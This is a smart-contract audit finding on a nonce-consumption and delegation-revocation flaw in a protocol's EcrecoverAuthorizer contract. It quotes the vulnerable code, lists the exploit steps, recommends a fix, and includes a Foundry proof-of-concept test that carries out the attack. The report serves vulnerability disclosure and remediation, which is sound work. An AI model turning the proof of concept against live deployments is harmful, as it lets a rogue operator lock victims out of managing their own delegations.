### Title
Authorized operator can consume victim's EcrecoverAuthorizer nonces and revoke delegations via self-signed Authorization structs - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any address that Midnight considers authorized for `authorization.authorizer`, but the nonce consumed is always `nonce[authorization.authorizer]`. This means an operator already authorized on Midnight can craft and sign `Authorization` structs naming the victim as `authorizer`, consuming the victim's nonces and revoking the victim's existing delegations without the victim's knowledge or consent.

### Finding Description
The exact reachable path is in `src/periphery/EcrecoverAuthorizer.sol` lines 24–48:

```solidity
require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce()); // line 26
// ...
address signer = ecrecover(digest, signature.v, signature.r, signature.s);
require(signer != address(0), InvalidSignature());
require(
    signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
); // lines 33-36
IMidnight(MIDNIGHT).setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer); // line 47
``` [1](#0-0) [2](#0-1) 

**Preconditions (both realistic for any active user):**
1. `isAuthorized[victim][operator] == true` on Midnight — victim previously authorized the operator for normal protocol operations.
2. `isAuthorized[victim][EcrecoverAuthorizer] == true` on Midnight — victim authorized `EcrecoverAuthorizer` to use sig-based delegation (required to use the feature at all).

**Exploit flow:**
1. Operator constructs `Authorization{authorizer=victim, authorized=<any_target>, isAuthorized=false, nonce=N}` where `N = nonce[victim]`.
2. Operator signs the EIP-712 digest with their own private key (not victim's).
3. Operator calls `EcrecoverAuthorizer.setIsAuthorized(auth, sig)`.
4. Line 26: nonce check passes — `N == nonce[victim]`, nonce is post-incremented to `N+1`.
5. Line 31: `ecrecover` returns `operator`.
6. Line 34: `signer == authorization.authorizer` → `operator == victim` → **false**.
7. Line 34: `IMidnight(MIDNIGHT).isAuthorized(victim, operator)` → **true** (precondition 1) → check passes.
8. Line 47: `Midnight.setIsAuthorized(<any_target>, false, victim)` is called; inside Midnight, `msg.sender = EcrecoverAuthorizer`, `isAuthorized[victim][EcrecoverAuthorizer]` is true (precondition 2), so the call succeeds. [3](#0-2) [4](#0-3) 

**Why existing checks fail:** The `Unauthorized()` guard only verifies that the signer is either the authorizer or a Midnight-authorized delegate of the authorizer. It does not restrict which address's nonce is consumed or which address's delegation state is modified. Because the nonce mapping is keyed by `authorization.authorizer` (the victim), not by `signer` (the operator), the operator's signature advances the victim's nonce counter and triggers state changes on the victim's behalf.

### Impact Explanation
The operator can, in a single transaction or a sequence of transactions:
- Revoke any of the victim's existing Midnight delegations (e.g., revoke `isAuthorized[victim][EcrecoverAuthorizer]`, blocking all future sig-based authorizations for the victim).
- Consume `N` consecutive nonces, invalidating any pre-signed `Authorization` structs the victim has prepared and distributed (e.g., to a relayer), causing all of them to revert with `InvalidNonce`.
- Effectively freeze the victim's ability to manage their own delegation state via `EcrecoverAuthorizer` until they re-authorize and re-sign everything.

### Likelihood Explanation
Preconditions are standard for any user actively using the protocol with an operator and `EcrecoverAuthorizer`. The attack requires no funds, no special role, and is repeatable: after the victim re-authorizes, the operator can repeat the attack. The operator need not be malicious in the traditional sense — a compromised or rogue operator key is sufficient.

### Recommendation
Remove the `isAuthorized` delegation path from the signer check in `EcrecoverAuthorizer.setIsAuthorized`. Only the `authorization.authorizer` themselves should be permitted to produce a signature that consumes their own nonce:

```solidity
require(signer == authorization.authorizer, Unauthorized());
```

If delegated signing is intentionally desired, the nonce must be keyed by `signer`, not by `authorization.authorizer`, and the downstream `Midnight.setIsAuthorized` call must be gated accordingly so that a delegate cannot unilaterally revoke the authorizer's other delegations. [2](#0-1) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {Authorization, Signature, AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH}
    from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";
import {IEcrecoverAuthorizer} from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract OperatorNonceGriefTest is BaseTest {
    // Helper: sign an Authorization as a given signer
    function signAs(Authorization memory auth, address _signer) internal view returns (Signature memory) {
        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
        bytes32 domainSep  = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(ecrecoverAuthorizer)));
        bytes32 digest     = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey[_signer], digest);
        return Signature({v: v, r: r, s: s});
    }

    function testOperatorConsumesVictimNonces() public {
        address victim   = borrower;   // has privateKey[borrower]
        address operator = lender;     // has privateKey[lender]

        // --- Setup ---
        // Victim authorizes EcrecoverAuthorizer on Midnight (normal usage)
        vm.prank(victim);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);

        // Victim authorizes operator on Midnight (normal usage)
        vm.prank(victim);
        midnight.setIsAuthorized(operator, true, victim);

        // Victim pre-signs an authorization at nonce 0 (e.g., to grant some future delegate)
        address futureDelegate = makeAddr("futureDelegate");
        Authorization memory victimAuth = Authorization({
            authorizer:   victim,
            authorized:   futureDelegate,
            isAuthorized: true,
            nonce:        0,
            deadline:     block.timestamp + 1 days
        });
        Signature memory victimSig = signAs(victimAuth, victim);

        // --- Attack: operator submits N revocations signed by operator (not victim) ---
        uint256 N = 3;
        for (uint256 i = 0; i < N; i++) {
            Authorization memory attackAuth = Authorization({
                authorizer:   victim,                        // victim's nonce consumed
                authorized:   address(ecrecoverAuthorizer),  // revoke EcrecoverAuthorizer
                isAuthorized: false,
                nonce:        i,
                deadline:     block.timestamp + 1 days
            });
            Signature memory attackSig = signAs(attackAuth, operator); // signed by operator, not victim

            // Re-authorize EcrecoverAuthorizer each round so the call to Midnight succeeds
            if (i > 0) {
                vm.prank(victim);
                midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);
            }

            ecrecoverAuthorizer.setIsAuthorized(attackAuth, attackSig); // succeeds
        }

        // --- Assert: victim's nonce is now N, pre-signed auth at nonce 0 is invalid ---
        assertEq(ecrecoverAuthorizer.nonce(victim), N);

        vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
        ecrecoverAuthorizer.setIsAuthorized(victimAuth, victimSig); // nonce 0 is stale
    }
}
```

**Expected assertions:**
- `ecrecoverAuthorizer.nonce(victim) == N` after the attack loop.
- `ecrecoverAuthorizer.setIsAuthorized(victimAuth, victimSig)` reverts with `InvalidNonce` — victim's pre-signed authorization is permanently invalidated.
- Each iteration of the attack loop succeeds without reverting, confirming the operator's signature is accepted for the victim's `authorizer` field.

### Citations

**File:** src/periphery/EcrecoverAuthorizer.sol (L26-26)
```text
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());
```

**File:** src/periphery/EcrecoverAuthorizer.sol (L33-36)
```text
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );
```

**File:** src/periphery/EcrecoverAuthorizer.sol (L46-47)
```text
        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
```

**File:** src/Midnight.sol (L731-733)
```text
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        isAuthorized[onBehalf][authorized] = newIsAuthorized;
```
